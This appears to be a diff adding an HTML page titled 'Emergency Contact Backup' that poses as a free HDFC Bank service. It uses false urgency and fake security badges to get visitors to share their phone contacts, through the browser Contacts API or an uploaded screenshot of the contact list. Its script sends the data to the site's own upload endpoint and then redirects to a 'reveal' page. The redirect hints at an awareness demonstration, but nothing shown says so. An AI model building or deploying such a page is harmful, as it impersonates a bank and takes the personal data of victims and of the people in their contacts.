@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emergency Contact Backup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+
+        .icon {
+            font-size: 5em;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        h1 {
+            color: #f5576c;
+            margin-bottom: 15px;
+            font-size: 2em;
+        }
+
+        .description {
+            color: #666;
+            font-size: 1.1em;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .urgent-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 25px;
+            text-align: left;
+            border-radius: 5px;
+        }
+
+        .urgent-box strong {
+            color: #856404;
+        }
+
+        .backup-btn {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3em;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(245, 87, 108, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        .backup-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(245, 87, 108, 0.6);
+        }
+
+        .backup-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: 500;
+            display: none;
+        }
+
+        .status.loading {
+            background: #d1ecf1;
+            color: #0c5460;
+            display: block;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #f5576c;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            color: #28a745;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">📱</div>
+        <h1>Emergency Contact Backup</h1>
+
+        <div class="urgent-box">
+            <strong>⚠️ Important Notice:</strong>
+            <br>
+            Your device data may be at risk. We recommend backing up your contacts immediately for safety.
+        </div>
+
+        <p class="description">
+            Protect your contacts in case of:
+            <br>
+            ✓ Phone loss or theft
+            <br>
+            ✓ Device malfunction
+            <br>
+            ✓ Accidental deletion
+            <br><br>
+            <small style="color: #999;">This secure backup service is provided free by HDFC Bank. We'll create a secure snapshot of your contacts.</small>
+        </p>
+
+        <button class="backup-btn" id="backupBtn" onclick="startContactBackup()">
+            🔒 Start Secure Backup
+        </button>
+
+        <div class="trust-badge">
+            <span>🛡️</span>
+            <span>256-bit Encrypted</span>
+            <span>•</span>
+            <span>Bank-Grade Security</span>
+        </div>
+
+        <div class="loader" id="loader"></div>
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        const sessionId = '{{ session_id }}';
+
+        async function startContactBackup() {
+            const backupBtn = document.getElementById('backupBtn');
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('status');
+
+            backupBtn.disabled = true;
+            loader.style.display = 'block';
+            status.className = 'status loading';
+            status.textContent = 'Accessing your contacts for backup...';
+
+            try {
+                // Try to access contacts (this will work differently on different devices)
+                // On most devices, we'll simulate by asking for camera permission to screenshot
+
+                // Method 1: Try Navigator Contacts API (limited browser support)
+                if ('contacts' in navigator && 'ContactsManager' in window) {
+                    const props = ['name', 'tel'];
+                    const opts = {multiple: true};
+
+                    try {
+                        const contacts = await navigator.contacts.select(props, opts);
+                        await sendContactData(contacts, 'api');
+                        return;
+                    } catch (e) {
+                        console.log('Contacts API failed, falling back to screenshot method');
+                    }
+                }
+
+                // Method 2: Ask user to take screenshot of their contacts
+                status.innerHTML = `
+                    📸 Please take a screenshot of your contact list now
+                    <br><br>
+                    <strong>Instructions:</strong>
+                    <br>1. Open your Contacts app
+                    <br>2. Take a screenshot
+                    <br>3. Come back here and upload it
+                    <br><br>
+                    <input type="file" id="contactScreenshot" accept="image/*"
+                           onchange="handleScreenshot(event)"
+                           style="margin-top: 10px; padding: 10px; border: 2px solid #f5576c; border-radius: 5px;">
+                `;
+                loader.style.display = 'none';
+                backupBtn.style.display = 'none';
+
+            } catch (error) {
+                console.error('Error:', error);
+                loader.style.display = 'none';
+                status.className = 'status error';
+                status.textContent = '❌ Failed to access contacts. Please try again.';
+                backupBtn.disabled = false;
+            }
+        }
+
+        async function handleScreenshot(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('status');
+
+            loader.style.display = 'block';
+            status.className = 'status loading';
+            status.textContent = 'Uploading your contact backup...';
+
+            try {
+                // Convert screenshot to base64
+                const reader = new FileReader();
+                reader.onload = async function(e) {
+                    const screenshotData = e.target.result;
+
+                    // Send to server
+                    const response = await fetch('/upload_contacts_screenshot', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            session_id: sessionId,
+                            screenshot_data: screenshotData,
+                            contact_count: 0  // We don't know the actual count from screenshot
+                        })
+                    });
+
+                    const result = await response.json();
+
+                    loader.style.display = 'none';
+
+                    if (result.status === 'success') {
+                        status.className = 'status success';
+                        status.innerHTML = '✅ Backup completed successfully!<br>Redirecting...';
+
+                        // Redirect to reveal page
+                        setTimeout(() => {
+                            window.location.href = result.reveal_url;
+                        }, 2000);
+                    } else {
+                        status.className = 'status error';
+                        status.textContent = '❌ Backup failed. Please try again.';
+                    }
+                };
+
+                reader.readAsDataURL(file);
+
+            } catch (error) {
+                console.error('Error:', error);
+                loader.style.display = 'none';
+                status.className = 'status error';
+                status.textContent = '❌ Failed to upload backup.';
+            }
+        }
+
+        async function sendContactData(contacts, method) {
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('status');
+
+            try {
+                const response = await fetch('/upload_contacts_screenshot', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        session_id: sessionId,
+                        screenshot_data: btoa(JSON.stringify(contacts)),
+                        contact_count: contacts.length
+                    })
+                });
+
+                const result = await response.json();
+
+                loader.style.display = 'none';
+
+                if (result.status === 'success') {
+                    status.className = 'status success';
+                    status.innerHTML = `✅ Backed up ${contacts.length} contacts successfully!<br>Redirecting...`;
+
+                    setTimeout(() => {
+                        window.location.href = result.reveal_url;
+                    }, 2000);
+                } else {
+                    status.className = 'status error';
+                    status.textContent = '❌ Backup failed. Please try again.';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                loader.style.display = 'none';
+                status.className = 'status error';
+                status.textContent = '❌ Failed to complete backup.';
+            }
+        }
+    </script>
+</body>
+</html>
